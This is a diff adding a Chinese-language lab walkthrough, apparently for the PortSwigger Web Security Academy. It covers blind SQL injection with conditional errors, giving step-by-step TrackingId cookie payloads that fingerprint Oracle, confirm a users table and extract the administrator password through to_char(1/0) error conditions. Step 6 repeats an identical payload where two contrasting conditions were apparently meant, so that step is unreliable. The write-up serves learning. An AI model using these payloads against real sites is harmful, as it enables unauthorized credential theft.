@@ -96,3 +96,16 @@
 然后对密码进行爆破，通过添加`' and (select substring(password,1,1) from users where username='administrator')='1`，我们可以使用`Cluster bomb`，同时遍历`substring`的index和盲注字符。
 
 在这里，我们可以直接对密码进行爆破，但实际环境中，我们需要一次对数据库名、表数量、表名、列数量、列名进行盲注，同时在最后对密码进行爆破时，也不可以使用类似于`Cluster bomb`的方式，我们可能需要利用二分查找等方式尽可能的减少请求次数，以规避将网站测试垮或自身访问被限制等风险。
+
+## 12: Blind SQL injection with conditional errors
+
+> 报错相关的注入我确实不太了解，跟着官方的solution做一遍学习学习。
+
+1. `TrackingId=xyz'`: 发现返回`500 Internal Server Error`。
+2. `TrackingId=xyz''`: 发现返回`200 OK`，网页也正常陈列商品。
+3. `TrackingId=xyz'||(select '' from dual)||'` 或 `TrackingId=xyz'||(select '')||'`: 根据是否报错判断数据库类型，此为Oracle。
+4. `TrackingId=xyz'||(select '' from not-a-real-table)||'`: 此时可以发现返回报错，这是我们就可以在中间这个语句加入一定条件判断从而进行盲注，常见报错条件例如`to_char(1/0)`。
+5. `TrackingId=xyz'||(select '' from users where rownum=1)||'`: 确定存在表`users`，需要注意的是*Oracle中没有`limit`，而使用`rownum`来控制查询区间。
+6. `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0)  end from dual)||'` 与 `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0) end from dual)||'`: 通过是否报错确定盲注语句正确。
+7. `'||(select case when (1=1) then '' else to_char(1/0) end from users where username='administrator')||'` 与 `'||(select case when (length(password)>1) then '' else to_char(1/0) end from users where username='administrator')||'`: 确定`administrator`用户并使用intruder盲注密码长度。
+8. 进行密码盲注。
